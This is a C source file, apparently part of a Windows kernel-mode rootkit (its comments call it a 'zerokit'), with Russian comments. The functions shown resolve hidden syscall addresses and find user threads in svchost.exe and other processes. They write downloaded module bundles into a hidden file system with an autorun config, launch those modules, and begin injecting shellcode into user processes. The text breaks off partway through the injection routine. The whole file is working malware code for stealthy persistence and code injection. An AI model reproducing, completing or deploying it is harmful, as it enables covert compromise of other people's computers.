
// Вызывать данную функцию следует внутри вызовов KeStackAttachProcess/KeUnstackDetachProcess
void* launcher_find_func_in_service_table(uint32_t funcHash)
{
    uint8_t* userNtFunc = NULL;
    void* ret = NULL;
    dissasm_info_t hde;
    USE_GLOBAL_BLOCK
    
    userNtFunc = pGlobalBlock->pCommonBlock->fnpe_find_export_by_hash(pGlobalBlock->pLauncherBlock->ntdllBase, funcHash, pGlobalBlock->pCommonBlock->fncommon_calc_hash);
    if (userNtFunc) {
        pGlobalBlock->pCommonBlock->fndissasm(userNtFunc, &hde);
        while (hde.opcode != 0xC3/*retn*/) {
            if (hde.opcode == 0xb8/*mov r16/32, imm16/32*/) {
                uint32_t index = hde.imm.imm32;
#ifdef _WIN64
                LARGE_INTEGER Addr;

                index *= 4;

                // Расчитываем адрес функции Nt* по смещению от начала KiServiceTable. Младшие 4 бита сожержат количество аргументов.
                Addr.QuadPart = (LONGLONG)pGlobalBlock->pCommonBlock->pKiServiceTable;

                if (pGlobalBlock->osMajorVersion >= 6) {
                    // Vista and newer
                    ulong_t Val = *(ulong_t*)(pGlobalBlock->pCommonBlock->pKiServiceTable + index);
                    Val -= *(pGlobalBlock->pCommonBlock->pKiServiceTable + index) & 15;
                    Addr.LowPart += Val >> 4;
                }
                else {
                    // Server 2003
                    Addr.LowPart += *(DWORD*)(pGlobalBlock->pCommonBlock->pKiServiceTable + index);
                    Addr.LowPart -= *(DWORD*)(pGlobalBlock->pCommonBlock->pKiServiceTable + index) & 15;
                }        

                ret = (void*)Addr.QuadPart;
#else
                ret = *(void**)(pGlobalBlock->pCommonBlock->pKiServiceTable + index * sizeof(void*));
#endif
                break;
            }
            userNtFunc += hde.len;
            pGlobalBlock->pCommonBlock->fndissasm(userNtFunc, &hde);
        }
    }

    return ret;
}

PEPROCESS launcher_find_user_thread_by_hash(uint32_t hashVal, PEPROCESS pEprocess, PETHREAD* ppEthread)
{
    PLIST_ENTRY currentProcess, startProcess;
    PLIST_ENTRY    threadList, startThread;    
    uint8_t threadState;
    char* moduleName;
    size_t len;
    uint32_t i;
    uint32_t nameHash;
    uint8_t* pPeb;
    USE_GLOBAL_BLOCK

    if (ppEthread) {
        *ppEthread = NULL;
    }

    startProcess = (PLIST_ENTRY)((uint8_t*)pGlobalBlock->pCommonBlock->fnIoGetCurrentProcess() + pGlobalBlock->pLauncherBlock->dwActiveProcessLinks);
    if (pEprocess == NULL) {
        currentProcess = startProcess->Flink;
    }
    else {
        currentProcess = ((PLIST_ENTRY)((uint8_t*)pEprocess + pGlobalBlock->pLauncherBlock->dwActiveProcessLinks))->Flink;
    }

    while (startProcess != currentProcess) {
        pEprocess = (PEPROCESS)((uint8_t*)currentProcess - pGlobalBlock->pLauncherBlock->dwActiveProcessLinks);

        if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pEprocess) && pGlobalBlock->pCommonBlock->fnMmIsAddressValid((uint8_t*)pEprocess + pGlobalBlock->pLauncherBlock->dwPeb)) {
            pPeb = *(uint8_t**)((uint8_t*)pEprocess + pGlobalBlock->pLauncherBlock->dwPeb);
            moduleName = (char*)pEprocess + pGlobalBlock->pLauncherBlock->dwImageFileName;
            len = pGlobalBlock->pCommonBlock->fnstrlen(moduleName);
            nameHash = pGlobalBlock->pCommonBlock->fncommon_calc_hash(moduleName, len);
            
            for (i = 0; i < EXCLUDE_COUNT; ++i) {
                if (pGlobalBlock->pLauncherBlock->excludeProcesses[i] == nameHash) {
                    break;
                }
            }

            if (i >= EXCLUDE_COUNT) {
                if (((puint_t)pPeb & 0xFF800000) && (hashVal == 0x2A || nameHash == hashVal)) {
                    if (ppEthread != NULL) {
                        startThread = threadList = ((LIST_ENTRY*)((uint8_t*)pEprocess + pGlobalBlock->pLauncherBlock->dwThreadListHead))->Flink;

                        do {
                            *ppEthread = (PETHREAD)((uint8_t*)threadList - pGlobalBlock->pLauncherBlock->dwThreadListEntry);
                            threadState = *(PUINT8)((PUINT8)(*ppEthread) + pGlobalBlock->pLauncherBlock->dwThreadState);
                            if (!pGlobalBlock->pCommonBlock->fnPsIsSystemThread(*ppEthread) && threadState > Ready && threadState < Transition && threadState != Terminated) {
                                FnKdPrint(("Found process 0x%x, Thread : 0x%x\n", pEprocess, *ppEthread));
                                return pEprocess;
                            }
                            threadList = threadList->Flink;
                        } while (threadList != NULL && threadList != startThread);
                    }
                    else {
                        return pEprocess;
                    }
                }
            }
        }
        currentProcess = currentProcess->Flink;
    }

    return NULL;
}

void launcher_stage1_init()
{
    KAPC_STATE apcState;
    PEPROCESS pep;
    //PETHREAD pet;
    LARGE_INTEGER delay;
    bool_t isComplete = FALSE;
    uint8_t* ntdllBase = NULL;
    USE_GLOBAL_BLOCK

    delay.QuadPart = -10000000I64;  // 1 минута

    // Дожидаемся создания процесса svchost.exe...
    while ((pep = pGlobalBlock->pLauncherBlock->fnlauncher_find_user_thread_by_hash(SVCHOST_EXE_HASH, NULL, NULL)) == NULL) {
        pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    }

    for ( ; !isComplete; ) { // Предотвращяем всяческие бсоды в результате невозможности получить необходимые данные
        // Вычисляем адреса функций через nt!KiServiceTable

        // На данном этапе получаем нужные адреса для истинного окружения системы. Для x32-систем это полностью приложимо.
        // Для x64 систем это относится только к x64-окружению, для x32-приложений адреса вычисляются на этапе APC-инжектирования.
        pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);
        do {
            PLIST_ENTRY pDllListHead = NULL;
            PLIST_ENTRY pDllListEntry = NULL;
            PUNICODE_STRING dllName;
            HANDLE hProcess;
            NTSTATUS ntStatus;
            PROCESS_BASIC_INFORMATION procInfo;
            ulong_t retLen;

            // Open process
            ntStatus = pGlobalBlock->pCommonBlock->fnObOpenObjectByPointer(pep, OBJ_KERNEL_HANDLE, NULL, SYNCHRONIZE, *pGlobalBlock->pCommonBlock->pPsProcessType, KernelMode, &hProcess);
            if (!NT_SUCCESS(ntStatus)) {
                break;
            }

            ntStatus = pGlobalBlock->pCommonBlock->fnNtQueryInformationProcess(hProcess, ProcessBasicInformation, &procInfo, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
            pGlobalBlock->pCommonBlock->fnZwClose(hProcess);
            if (ntStatus == STATUS_SUCCESS) {
                pDllListHead = *(void**)(*(uint8_t**)((uint8_t*)procInfo.PebBaseAddress + pGlobalBlock->pLauncherBlock->dwLdr) + pGlobalBlock->pLauncherBlock->dwInMemoryOrderModuleList);
            }
            else if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid((uint8_t*)pep + pGlobalBlock->pLauncherBlock->dwPeb)) {
                // В ином случае у нас не остаётся выбора, кроме как надеятся на то, что мы поддерживаем систему... :)
                pDllListHead = *(void**)(*(uint8_t**)(*(uint8_t**)((uint8_t*)pep + pGlobalBlock->pLauncherBlock->dwPeb) + pGlobalBlock->pLauncherBlock->dwLdr) + pGlobalBlock->pLauncherBlock->dwInMemoryOrderModuleList);
            }
            else {
                break;
            }

            if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pDllListHead)) {
                pDllListEntry = pDllListHead->Flink;
                while (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pDllListEntry) && (pDllListEntry != pDllListHead)) {
                    dllName = (PUNICODE_STRING)((uint8_t*)pDllListEntry + pGlobalBlock->pLauncherBlock->dwFullDllName);

                    if (pGlobalBlock->pCommonBlock->fnMmIsAddressValid(dllName) && pGlobalBlock->pCommonBlock->fncommon_calc_hash((uint8_t*)dllName->Buffer, dllName->Length) == NTDLL_DLL_HASH) {
                        ntdllBase = *(uint8_t**)((uint8_t*)pDllListEntry + pGlobalBlock->pLauncherBlock->dwDllBase);
                        break;
                    }
                    pDllListEntry = pDllListEntry->Flink;
                }
            }

            if (ntdllBase != NULL) {
                pGlobalBlock->pLauncherBlock->ntdllBase = ntdllBase;
                pGlobalBlock->pLauncherBlock->ntdllSize = ((PIMAGE_NT_HEADERS)(((PIMAGE_DOS_HEADER)ntdllBase)->e_lfanew + ntdllBase))->OptionalHeader.SizeOfImage;

                if (pGlobalBlock->osMajorVersion > 5) {
                    *(void**)&pGlobalBlock->pLauncherBlock->fnNtCreateThreadEx = pGlobalBlock->pLauncherBlock->fnlauncher_find_func_in_service_table(NtCreateThreadEx_Hash);
                    isComplete = (pGlobalBlock->pLauncherBlock->fnNtCreateThreadEx != NULL);

//                     {
//                         char filename[] = {'\\', '?', '?' ,'\\', 'C', ':', '\\', '1', '.', 'x', '\0'};
//                         pGlobalBlock->pCommonBlock->fncommon_save_file(filename, (uint8_t*)&pGlobalBlock->pLauncherBlock->fnNtCreateThreadEx, sizeof(pGlobalBlock->pLauncherBlock->fnNtCreateThreadEx));
//                     }
                }
                else {
                    *(void**)&pGlobalBlock->pLauncherBlock->fnNtCreateThread = pGlobalBlock->pLauncherBlock->fnlauncher_find_func_in_service_table(NtCreateThread_Hash);
                    *(void**)&pGlobalBlock->pLauncherBlock->fnNtResumeThread = pGlobalBlock->pLauncherBlock->fnlauncher_find_func_in_service_table(NtResumeThread_Hash);
                    *(void**)&pGlobalBlock->pLauncherBlock->fnNtProtectVirtualMemory = pGlobalBlock->pLauncherBlock->fnlauncher_find_func_in_service_table(NtProtectVirtualMemory_Hash);
                    isComplete = (pGlobalBlock->pLauncherBlock->fnNtCreateThread != NULL && pGlobalBlock->pLauncherBlock->fnNtResumeThread != NULL &&
                        pGlobalBlock->pLauncherBlock->fnNtProtectVirtualMemory != NULL);
                }
            }
        } while (0);
        pGlobalBlock->pCommonBlock->fnKeUnstackDetachProcess(&apcState);

        if (!isComplete) {
            pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
        }
    }

    // Регистрируем функции для (де)регистрации процессов в системе.
    while (pGlobalBlock->pCommonBlock->fnPsSetCreateProcessNotifyRoutine(pGlobalBlock->pLauncherBlock->fnlauncher_create_process_notifier, FALSE) != STATUS_SUCCESS) {
        pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    }
}

bool_t launcher_process_bundle(pbundle_header_t pBundleHeader, uint8_t* pSha1Hash, bool_t saveOnly)
{
    pbundle_file_header_t pPackFileHeader;
    uint32_t blocksNum = 0;
    uint32_t processedFiles = 0;
    uint32_t flags, written, i1, i2;
    uint8_t* configBuffer;
    uint32_t newConfigSize;
    int err = ERR_OK;
    char* ptr;
    char* ptrProc;
    uint32_t replies;
    pzautorun_config_entry_t pFirstBlock, pConfigBlock1, pConfigBlock2;
    bundle_info_entry_t bundleEntry;
    LARGE_INTEGER delay;
    pzfs_file_t pFile;
    char savedFileName[4 * ZFS_MAX_FILENAME];
    USE_GLOBAL_BLOCK

    // Инструкция для разработчиков библиотек.
    // 1. Имена в конфиге должны быть только в нижнем регистре.
    // 2. При добавлении нового файла поле flags должно быть сформировано следующим образом:
    //    - Бит 0 - для x64 модулей должен быть выставлен в 1.
    //    - Бит 1 - для модулей запускаемых из памяти должен быть выставлен в 1. Это относится к шеллкодам и DLL, тогда как для EXE можно и так и так.
    //    - Бит 4 - должен обнуляться всегда.
    //    - Бит 31 - должен выставляться для новых или обновлённых файлов.
    // Сам зерокит будет сохранять все флаги как есть. По ним же можно будет определять кто именно добавил или обновил файл.

    // Если бандл содержит обновление, то он однозначно не может содержать других файлов.

    delay.QuadPart = -30000000I64;  // 3 секунды

    ptr = savedFileName;
    *((uint32_t*)ptr) = 0x7273755C;
    *(ptr + 4) = '\\';
    MEMCPY(ptr + 5, pBundleHeader->name, pBundleHeader->nameLen);
    *(ptr + 5 + pBundleHeader->nameLen) = 0x00;

    // 1. Сохранить файлы, у которых есть установленный бит FLAG_SAVE_TO_FS в ФС (кроме своих обновлений).
    pPackFileHeader = (pbundle_file_header_t)(pBundleHeader + 1);

//     // Пропускаем обновление.
//     if (((pPackFileHeader->flags >> FLAG_TYPE_SHIFT) & FLAG_TYPE_MASK) == FLAG_TYPE_UPDATE) {
//         return;
//     }

    err = pGlobalBlock->pFsBlock->fnzfs_mkdir(pGlobalBlock->pFsBlock->pZfsIo, ptr, 0);
    if (err != ERR_OK && err != (ZFS_ERR_DIR_OBJECT_EXISTS | ZFS_MKDIR)) {
        return FALSE;
    }

    *(ptr + 5 + pBundleHeader->nameLen) = 0x5C;

    do {
        if (pPackFileHeader->flags & FLAG_SAVE_TO_FS && pGlobalBlock->pFsBlock->pZfsIo != NULL) {
            int attempts = 3;
            // Все, загружаемые зерокитом файлы, сохраняются в корневом каталоге файловой системы.
            // Если файл с указанным именем уже существует, мы перезаписываем его.
            MEMCPY(ptr + 6 + pBundleHeader->nameLen, pPackFileHeader->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pPackFileHeader->fileName) + 1);
            do {
                err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, ptr, ZFS_MODE_READ, 0);
                if (err == ERR_OK) {
                    pGlobalBlock->pFsBlock->fnzfs_close(pFile);
                    replies = 0;
                    do {
                        err = pGlobalBlock->pFsBlock->fnzfs_unlink(pGlobalBlock->pFsBlock->pZfsIo, ptr, 0);
                        if (err == ERR_OK) {
                            break;
                        }
                        pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
                    } while (++replies < 3);
                    if (replies == 3) {
                        return FALSE;
                    }
                }

                err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, ptr, ZFS_MODE_CREATE | ZFS_MODE_WRITE | ZFS_MODE_TRUNCATE, 0);
                if (err == ERR_OK) {
                    written = 0;
                    err = pGlobalBlock->pFsBlock->fnzfs_write(pFile, (uint8_t*)pPackFileHeader + sizeof(bundle_file_header_t) + (pPackFileHeader->processesCount - 1) * sizeof(pPackFileHeader->process1Name), pPackFileHeader->fileSize, &written);

                    if (err != ERR_OK) {
                        // Удаляем файл и возвращаем ошибку.
                        pGlobalBlock->pFsBlock->fnzfs_close(pFile);
                        pGlobalBlock->pFsBlock->fnzfs_unlink(pGlobalBlock->pFsBlock->pZfsIo, ptr, 0);
                        return FALSE;
                    }

                    pGlobalBlock->pFsBlock->fnzfs_close(pFile);
                }

                if (err != ERR_OK) {
                    pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
                }
                --attempts;
            } while (err != ERR_OK && attempts > 0);
        }

        if (err != ERR_OK) {
            // Если не получилось сохранить файл, выходим.
            return FALSE;
        }

        // Подсчитываем количество новых блоков.
        flags = pPackFileHeader->flags;
        // Проверяем тип файла.
        if ((flags & FLAG_ISEXEC) && (flags & FLAG_AUTOSTART) && (flags & FLAG_SAVE_TO_FS)) {
            // Подсчитываем количество новых блоков.
            blocksNum += pPackFileHeader->processesCount;
        }

        // Переходим к следующему файлу.
        pPackFileHeader = (pbundle_file_header_t)((uint8_t*)pPackFileHeader + pPackFileHeader->fileSize + sizeof(bundle_file_header_t) + (pPackFileHeader->processesCount - 1) * sizeof(pPackFileHeader->process1Name));
        ++processedFiles;
    } while (processedFiles < pBundleHeader->numberOfFiles);

    // Выделяем место для новых модулей.
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pFirstBlock, blocksNum * sizeof(zautorun_config_entry_t), NonPagedPool);
    pConfigBlock1 = pFirstBlock;
    // 2. Сформировать конфигурационные блоки и сохранить в конфигурационный файл в ФС.
    processedFiles = 0;
    pPackFileHeader = (pbundle_file_header_t)(pBundleHeader + 1);
    do {
        flags = pPackFileHeader->flags;
        // Проверяем тип файла.

        if ((flags & FLAG_ISEXEC) && (flags & FLAG_AUTOSTART) && (flags & FLAG_SAVE_TO_FS)) {
            // Для того, чтобы файл попал в конфиг он должен иметь флаги: FLAG_AUTOSTART, FLAG_SAVE_TO_FS.
            ptrProc = pPackFileHeader->process1Name;
            for (written = 0; written < pPackFileHeader->processesCount; ++written) {
                MEMCPY(ptr + 6 + pBundleHeader->nameLen, pPackFileHeader->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pPackFileHeader->fileName) + 1);
                MEMCPY(pConfigBlock1->fileName, savedFileName, pGlobalBlock->pCommonBlock->fnstrlen(savedFileName) + 1);
                MEMCPY(pConfigBlock1->processName, ptrProc, pGlobalBlock->pCommonBlock->fnstrlen(ptrProc) + 1);
                pConfigBlock1->flags = flags; // Устанавливаем флаг запуска при проверке.
                ptrProc += sizeof(pConfigBlock1->processName);
                ++pConfigBlock1;
            }
        }

        // Преходим к следующему файлу.
        pPackFileHeader = (pbundle_file_header_t)((uint8_t*)pPackFileHeader + pPackFileHeader->fileSize + sizeof(bundle_file_header_t) + (pPackFileHeader->processesCount - 1) * sizeof(pPackFileHeader->process1Name));
        ++processedFiles;
    } while (processedFiles < pBundleHeader->numberOfFiles);

    // Сохраняем новые блоки в конфигурационный файл.
    newConfigSize = blocksNum * sizeof(zautorun_config_entry_t);
    if (configBuffer = pGlobalBlock->pLauncherBlock->fnlauncher_load_config(&newConfigSize, &pFile, ZFS_MODE_READ | ZFS_MODE_WRITE | ZFS_MODE_CREATE)) {
        // Пробегаемся по всему списку блоков для поиска старых блоков с новыми файлами.
        written = (pFile->filesize - (pFile->filesize != 0 ? 20 : 0)) / sizeof(zautorun_config_entry_t);
        pConfigBlock1 = (pzautorun_config_entry_t)((uint8_t*)configBuffer + 20);
        for (i1 = 0; i1 < written; ++i1, ++pConfigBlock1) {
            pConfigBlock2 = pFirstBlock;
            for (i2 = 0; i2 < blocksNum; ++i2, ++pConfigBlock2) {
                if (pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock1->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->fileName)) ==
                    pGlobalBlock->pCommonBlock->fncommon_calc_hash(pConfigBlock2->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock2->fileName))) {
                        MEMCPY(pConfigBlock1->fileName, pConfigBlock2->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock2->fileName) + 1);
                        MEMCPY(pConfigBlock1->processName, pConfigBlock2->processName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock2->processName) + 1);
                        pConfigBlock1->flags = pConfigBlock2->flags;
                        pConfigBlock2->flags |= TFLAG_EXISTING; // Указываем, что блок скопирован.
                        break;
                }
            }
        }

        pConfigBlock1 = (pzautorun_config_entry_t)(configBuffer + pFile->filesize + (pFile->filesize == 0 ? 20 : 0));
        pConfigBlock2 = pFirstBlock;
        for (i2 = 0; i2 < blocksNum; ++i2, ++pConfigBlock2) {
            if (!(pConfigBlock2->flags & TFLAG_EXISTING)) {
                MEMCPY(pConfigBlock1, pConfigBlock2, sizeof(zautorun_config_entry_t));
                ++pConfigBlock1;
            }
        }

        // Избавляемся от дубликатов.
        written = (uint32_t)((uint8_t*)pConfigBlock1 - (configBuffer + 20)) / sizeof(zautorun_config_entry_t);
        pConfigBlock1 = (pzautorun_config_entry_t)((uint8_t*)configBuffer + 20);
        for (i1 = 0; i1 < (written - 1); ++i1, ++pConfigBlock1) {
            pConfigBlock2 = pConfigBlock1 + 1;
            for (i2 = i1 + 1; i2 < written; ++i2, ++pConfigBlock2) {
                if (MEMCMP(pConfigBlock1->fileName, pConfigBlock2->fileName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->fileName)) &&
                    MEMCMP(pConfigBlock1->processName, pConfigBlock2->processName, pGlobalBlock->pCommonBlock->fnstrlen(pConfigBlock1->processName)) &&
                    !(pConfigBlock1->flags & TFLAG_FAKE)) {
                        pConfigBlock2->flags |= TFLAG_FAKE;
                }
            }
        }

        // Удаляем дубликаты.
        pConfigBlock1 = (pzautorun_config_entry_t)((uint8_t*)configBuffer + 20);
        for (i1 = 0; i1 < written; ++i1, ++pConfigBlock1) {
            if (pConfigBlock1->flags & TFLAG_FAKE) {
                MEMCPY(pConfigBlock1, pConfigBlock1 + 1, (written - i1 - 1) * sizeof(zautorun_config_entry_t));
                --written;
                --i1;
            }
        }

        pGlobalBlock->pLauncherBlock->fnlauncher_save_config(pFile, configBuffer, written * sizeof(zautorun_config_entry_t));

        if (pBundleHeader->updatePeriod > 0) {
            __stosb((uint8_t*)&bundleEntry, 0, sizeof(bundleEntry));
            __movsb(bundleEntry.name, pBundleHeader->name, pBundleHeader->nameLen);
            __movsb(bundleEntry.sha1, pSha1Hash, sizeof(bundleEntry.sha1));
            bundleEntry.updatePeriod = pBundleHeader->updatePeriod;
            pGlobalBlock->pTasksBlock->fntasks_save_bundle_entry(&bundleEntry);
        }

        if (!saveOnly) {
            // Запускаем модули.
            pGlobalBlock->pLauncherBlock->fnlauncher_process_config_entries(pFirstBlock, blocksNum, TRUE);
        }
    }

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFirstBlock, LOADER_TAG);

    return TRUE;
}

void launcher_process_modules()
{
    KIRQL x;
    uint32_t result;
    pzfile_list_entry_t pListHead;
    pzfile_list_entry_t pFileItem = NULL;
    USE_GLOBAL_BLOCK

    // У нас новый(е) модуль(и) или (переза)выгрузка существующих.
    pListHead = &pGlobalBlock->pLauncherBlock->runningListHead;
    pFileItem = (pzfile_list_entry_t)pListHead->Flink;
    while (pFileItem != pListHead) {
        if (pFileItem->runtimeState == ZRUNTIME_FLAG_ZOMBI) {
            pzfile_list_entry_t pTmpItem;
remove_zombi:
            x = pGlobalBlock->pCommonBlock->fnKfAcquireSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList);
            pTmpItem = (pzfile_list_entry_t)pFileItem->Blink;
            pGlobalBlock->pCommonBlock->fncommon_remove_entry_list((PLIST_ENTRY)pFileItem);
            pGlobalBlock->pCommonBlock->fnKfReleaseSpinLock(&pGlobalBlock->pLauncherBlock->slRunningList, x);

            if (pGlobalBlock->pLauncherBlock->pOverlordZfileEntry == pFileItem) {
                pGlobalBlock->pLauncherBlock->fnlauncher_define_overlord_zfile(pFileItem->name, NULL);
            }

            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFileItem, LOADER_TAG);
            pFileItem = pTmpItem;
        }
        else if (pFileItem->runtimeState != ZRUNTIME_FLAG_LOADED) {
            bool_t isOK = TRUE;
            // Загружаем файле, если он ещё не загружен.
            if (pFileItem->runtimeState != ZRUNTIME_FLAG_UNLOAD) {
                // Проверяем наличие нужных для модуля флагов.
                pFileItem->fileBuffer = pGlobalBlock->pLauncherBlock->fnlauncher_load_file(pFileItem->name, pGlobalBlock->pCommonBlock->fnstrlen(pFileItem->name), &pFileItem->bufferSize);
                isOK = (pFileItem->fileBuffer != NULL);
            }
            else {
                pFileItem->fileBuffer = NULL;
            }

            if (isOK) {
                result = pGlobalBlock->pLauncherBlock->fnlauncher_process_zfile(pFileItem);

                pFileItem->fileBuffer = NULL;
                pFileItem->bufferSize = 0;

                if (pFileItem->runtimeState == ZRUNTIME_FLAG_UNLOAD) {
                    InterlockedExchange(&pFileItem->runtimeState, (result == SC_RESULT_OK ? ZRUNTIME_FLAG_ZOMBI : ZRUNTIME_FLAG_UNLOAD));
                }
                else {
                    InterlockedExchange(&pFileItem->runtimeState, (result == SC_RESULT_OK ? ZRUNTIME_FLAG_LOADED : ZRUNTIME_FLAG_ZOMBI/*(++pZfileInfo->launchAttempts <= 3 ? ZRUNTIME_FLAG_NEW : ZRUNTIME_FLAG_ZOMBI)*/));
                }

                if (pFileItem->runtimeState == ZRUNTIME_FLAG_ZOMBI) {
                    goto remove_zombi;
                }
                else if (pFileItem->runtimeState == ZRUNTIME_FLAG_LOADED) {
                    pGlobalBlock->pLauncherBlock->fnlauncher_define_overlord_zfile(pFileItem->name, pFileItem);
                }
            }
        }

        pFileItem = (pzfile_list_entry_t)pFileItem->Flink;
    }

    {
        // Очищаем хеш-таблицу.
        uint32_t i;
        pfile_hash_entry_t pFileEntry;

        pFileEntry = pGlobalBlock->pLauncherBlock->pFilesHashTable;
        for (i = 0; i < 7; ++i) {
            if (pFileEntry->hashVal != 0) {
                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(pFileEntry->fileBuffer, LOADER_TAG);
                pFileEntry->fileSize = 0;
                pFileEntry->fileBuffer = NULL;
                pFileEntry->hashVal = 0;
            }
            ++pFileEntry;
        }
    }

//     unixTime = 0;
//     pGlobalBlock->pFsBlock->fnzfs_get_time(pGlobalBlock->pFsBlock->pZfsIo, pGlobalBlock->pCommonBlock->configPath, ETimeMod, &unixTime, 0);
// 
//     if (pGlobalBlock->pLogicBlock->useFs && unixTime != 0 && unixTime != pGlobalBlock->pLauncherBlock->configUnixTime) {
//         pGlobalBlock->pLauncherBlock->configUnixTime = unixTime;
// 
//         //            pGlobalBlock->pLauncherBlock->Fnlauncher_load_config()
//         replies = 0;
//         delay.QuadPart = -110000000I64;  // 11 секунд.
//         // Пытаемся открыть конфигурационный файл максимум 7 раз.
//         do {
//             err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, pGlobalBlock->pCommonBlock->configPath, ZFS_MODE_READ | ZFS_MODE_WRITE | ZFS_MODE_CREATE, 0);
//             if (err == ERR_OK) {
//                 break;
//             }
//             pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
//         } while (err != ERR_OK && ++replies < 3);
// 
//         if (err == ERR_OK) {
//             // Читаем конфиг.
//             pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &configBuffer, pFile->filesize, NonPagedPool);
//             if (pGlobalBlock->pFsBlock->fnzfs_read(pFile, configBuffer, pFile->filesize, &written) == ERR_OK && pFile->filesize == written) { // Конфиг успешно открыт.
//                 written /= sizeof(zautorun_config_entry_t);
//                 pConfigBlock = (pzautorun_config_entry_t)configBuffer;
//                 // Пробегаемся по всем блокам в поисках новых файлов.
//                 for (i = 0; i < written; ++i) {
//                     if (pConfigBlock->flags & FLAG_NEW_MODULE) {
//                         pConfigBlock->flags &= 0x7FFFFFFF;
// 
//                         pGlobalBlock->pLauncherBlock->fnlauncher_process_config_entries(pConfigBlock, 1, TRUE);
// 
//                     }
//                     ++pConfigBlock;
//                 }
//             }
// 
//             // Сохраняем изменённый конфиг.
//             if (pGlobalBlock->pFsBlock->fnzfs_seek(pFile, 0, ZFS_SEEK_SET) == ERR_OK) {
//                 pGlobalBlock->pFsBlock->fnzfs_write(pFile, configBuffer, pFile->filesize, &written);
//             }
//             pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(configBuffer, LOADER_TAG);
//             pGlobalBlock->pFsBlock->fnzfs_close(pFile);
// 
//             // Обновляем дату изменения конфига.
//             pGlobalBlock->pFsBlock->fnzfs_get_time(pGlobalBlock->pFsBlock->pZfsIo, pGlobalBlock->pCommonBlock->configPath, ETimeMod, &pGlobalBlock->pLauncherBlock->configUnixTime, 0);
//         }
// 
//         delay.QuadPart = -1800000000I64; // 3 минуты.
//     }
}

void launcher_autostart_modules()
{
    uint32_t readed = 0;
    uint8_t* configBuffer;
    USE_GLOBAL_BLOCK

    configBuffer = pGlobalBlock->pLauncherBlock->fnlauncher_load_config(&readed, NULL, ZFS_MODE_READ);
    if (configBuffer != NULL) {
        readed = (readed - (readed != 0 ? 20 : 0)) / sizeof(zautorun_config_entry_t);
        if (readed > 0) {
            pGlobalBlock->pLauncherBlock->fnlauncher_process_config_entries((pzautorun_config_entry_t)(configBuffer + 20), readed, TRUE);
            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(configBuffer, LOADER_TAG);
        }
    }
}

uint32_t launcher_execute_shellcode(PEPROCESS pep, uint8_t* pSc, uint32_t scSize, uint8_t* inData, uint32_t inDataSize, uint8_t** pOutData, uint32_t* pOutDataSize, PLARGE_INTEGER pTimeOut, bool_t isNative)
{
    uint32_t result = 0;
    //     PKAPC pApc = NULL;
    //     PLIST_ENTRY    threadList, startThread;
    //     PETHREAD pet = NULL;
    //     uint8_t threadState;
    //     uint8_t* threadStartAddress;
    //     uint8_t wr = 0;
    //     bool_t isOK = FALSE;
    NTSTATUS ntStatus;
    HANDLE hProcess;
    KAPC_STATE apcState;
    LARGE_INTEGER delay;
    uint32_t pageSize;
    size_t realSize;
    uint32_t realScSize;
    uint32_t realDataSize;
    uint32_t realScKernel32FinderSize;
    uint32_t realScExportFinderSize;
    uint8_t* pUserMemory = NULL;
    uint8_t* pUserData;
    uint32_t r3ScKernel32FinderSize;
    uint32_t r3ScExportFinderSize;
    pshellcode_block_t pShellcodeBlock = NULL;
#ifdef _WIN64
    ULONG_PTR isWow64 = 0;
    pshellcode64_block_t pShellcode64Block = NULL;
#endif // _WIN64
    uint32_t* pResult;
    bool_t isGoodMem = TRUE;
    USE_GLOBAL_BLOCK

    pageSize = pGlobalBlock->systemInfo.PageSize;

    do {
        pGlobalBlock->pCommonBlock->fnKeStackAttachProcess(pep, &apcState);

        // Получаем описатель процесса.
        ntStatus = pGlobalBlock->pCommonBlock->fnObOpenObjectByPointer(pep, OBJ_KERNEL_HANDLE, NULL, SYNCHRONIZE, *pGlobalBlock->pCommonBlock->pPsProcessType, KernelMode, &hProcess);
        if (!NT_SUCCESS(ntStatus)) {
            break;
        }


#ifdef _WIN64
        // Проверяем является ли процесс 64-битным.
        if (!NT_SUCCESS(ntStatus = pGlobalBlock->pCommonBlock->fnNtQueryInformationProcess(hProcess, ProcessWow64Information, &isWow64, sizeof(ULONG_PTR), NULL))) {
            break;
        }
        if (isWow64 == 0) {
            pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pShellcode64Block, sizeof(shellcode64_block_t), NonPagedPool);
            r3ScKernel32FinderSize = sizeof(sc_ntdll_finder_x64);
